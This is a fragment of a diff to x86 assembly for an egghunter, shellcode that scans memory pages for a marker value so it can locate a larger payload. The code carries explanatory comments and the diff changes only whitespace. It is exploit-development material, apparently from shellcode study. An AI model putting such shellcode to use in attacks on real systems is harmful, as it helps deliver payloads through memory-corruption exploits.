@@ -8,12 +8,12 @@ global _start
 section .text
 _start:
 
-  mov ebx, 0x50905090             ; Store EGG in ebx
+  	mov ebx, 0x50905090             ; Store EGG in ebx
 	xor ecx, ecx                    ; Zero out ECX
 	mul ecx                         ; Zero out EAX and EDX
-next_page:                        ; JMP to increment page number, because if an address in the page is invalid, all other addresses in the page are invalid. 
+next_page:                       	; JMP to increment page number, because if an address in the page is invalid, all other addresses in the page are invalid. 
 	or dx, 0xfff                    ; Align page address
-next_address:                     ; JMP to increment address
+next_address:                     	; JMP to increment address
 	inc edx                         ; If the address was invalid, this line finishes the alignment. Otherwise it will simply increment edx to check the next address. 
 	pushad                          ; Push general registers onto stack
 	lea ebx, [edx+4]                ; [edx+4] so we can compare [edx] and [edx+4] at the same time  ebx must contain the pointer to the address to be validated, which is pointed by edx, The +4 is an optimization.
